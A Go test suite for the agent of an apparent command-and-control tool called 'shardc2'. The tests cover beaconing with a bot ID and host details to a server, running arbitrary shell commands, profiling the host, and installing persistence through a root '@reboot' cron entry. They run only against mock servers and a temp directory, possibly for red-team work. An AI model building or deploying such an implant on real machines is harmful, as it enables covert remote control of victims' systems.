package agent

import (
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"testing"
)

func TestBeacon(t *testing.T) {
	var receivedBody []byte
	var receivedMethod string
	var receivedContentType string

	// Create a mock server
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/beacon" && r.Method == "POST" {
			receivedMethod = r.Method
			receivedContentType = r.Header.Get("Content-Type")
			body, _ := io.ReadAll(r.Body)
			receivedBody = body
			w.WriteHeader(http.StatusOK)
			w.Write([]byte(`{"status": "ok", "pending_commands": 0}`))
		} else {
			w.WriteHeader(http.StatusNotFound)
		}
	}))
	defer server.Close()

	agent := New(server.URL)
	agent.BotID = "test-bot"

	// Call beacon
	err := agent.Beacon()
	if err != nil {
		t.Fatalf("Expected beacon to succeed, got error: %v", err)
	}

	// Assertions
	if receivedMethod != "POST" {
		t.Errorf("Expected method POST, got %s", receivedMethod)
	}
	if receivedContentType != "application/json" {
		t.Errorf("Expected Content-Type application/json, got %s", receivedContentType)
	}

	var data map[string]interface{}
	err = json.Unmarshal(receivedBody, &data)
	if err != nil {
		t.Fatalf("Failed to unmarshal received body: %v", err)
	}
	if data["bot_id"] != "test-bot" {
		t.Errorf("Expected bot_id test-bot, got %v", data["bot_id"])
	}
	if data["hostname"] == "" {
		t.Errorf("Expected hostname to be set, got empty")
	}
	if data["os"] == "" {
		t.Errorf("Expected os to be set, got empty")
	}
}

func TestBeaconNetworkFailure(t *testing.T) {
	// Test with invalid URL
	agent := New("http://invalid.url.that.does.not.exist")
	agent.BotID = "test-bot"

	err := agent.Beacon()
	if err == nil {
		t.Fatal("Expected beacon to fail with invalid URL, but it succeeded")
	}
}

func TestBeaconServerError(t *testing.T) {
	// Create a server that returns 500
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
	}))
	defer server.Close()

	agent := New(server.URL)
	agent.BotID = "test-bot"

	err := agent.Beacon()
	if err == nil {
		t.Fatal("Expected beacon to fail with 500 status, but it succeeded")
	}
}

func TestExecuteCommand(t *testing.T) {
	agent := New("http://localhost:8080")
	result, err := agent.ExecuteCommand("echo hello")
	if err != nil {
		t.Fatalf("Expected command to execute, got error: %v", err)
	}
	if result != "hello\n" {
		t.Errorf("Expected 'hello\\n', got %q", result)
	}
}

func TestExecuteCommandFailure(t *testing.T) {
	agent := New("http://localhost:8080")
	_, err := agent.ExecuteCommand("false")
	if err == nil {
		t.Fatal("Expected command to fail")
	}
}

func TestExecuteCommandEmpty(t *testing.T) {
	agent := New("http://localhost:8080")
	_, err := agent.ExecuteCommand("")
	if err == nil {
		t.Fatal("Expected empty command to fail")
	}
}

func TestProfileSystem(t *testing.T) {
	agent := New("http://localhost:8080")
	profile, err := agent.ProfileSystem()
	if err != nil {
		t.Fatalf("Expected profiling to succeed, got error: %v", err)
	}
	if profile.Hostname == "" {
		t.Error("Expected hostname to be set")
	}
	if profile.OS == "" {
		t.Error("Expected OS to be set")
	}
	if profile.Arch == "" {
		t.Error("Expected Arch to be set")
	}
	if profile.User == "" {
		t.Error("Expected User to be set")
	}

	// Test default user case
	t.Run("default user", func(t *testing.T) {
		originalUser := os.Getenv("USER")
		defer func() {
			if originalUser != "" {
				os.Setenv("USER", originalUser)
			} else {
				os.Unsetenv("USER")
			}
		}()
		os.Unsetenv("USER")
		profile2, err := agent.ProfileSystem()
		if err != nil {
			t.Fatalf("Expected profiling to succeed, got error: %v", err)
		}
		if profile2.User != "unknown" {
			t.Errorf("Expected user to be 'unknown' when USER env var is not set, got %q", profile2.User)
		}
	})
}

func TestInstallPersistence(t *testing.T) {
	agent := New("http://localhost:8080")

	// Create temp dir for testing
	tempDir, err := os.MkdirTemp("", "shardc2-test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tempDir)

	// Install persistence to temp dir
	err = agent.InstallPersistence(tempDir)
	if err != nil {
		t.Fatalf("Expected persistence to install, got error: %v", err)
	}

	// Check if file was created
	cronPath := tempDir + "/shardc2"
	if _, err := os.Stat(cronPath); os.IsNotExist(err) {
		t.Fatalf("Cron file was not created: %s", cronPath)
	}

	// Check file permissions
	info, err := os.Stat(cronPath)
	if err != nil {
		t.Fatalf("Failed to stat cron file: %v", err)
	}
	expectedMode := os.FileMode(0644)
	if info.Mode().Perm() != expectedMode {
		t.Errorf("Expected file permissions %v, got %v", expectedMode, info.Mode().Perm())
	}

	// Check file content
	content, err := os.ReadFile(cronPath)
	if err != nil {
		t.Fatalf("Failed to read cron file: %v", err)
	}
	// Check that it contains "@reboot root" and ends with " --daemon\n"
	if !strings.Contains(string(content), "@reboot root") {
		t.Errorf("Expected cron content to contain '@reboot root', got %q", string(content))
	}
	if !strings.HasSuffix(string(content), " --daemon\n") {
		t.Errorf("Expected cron content to end with ' --daemon\\n', got %q", string(content))
	}
}
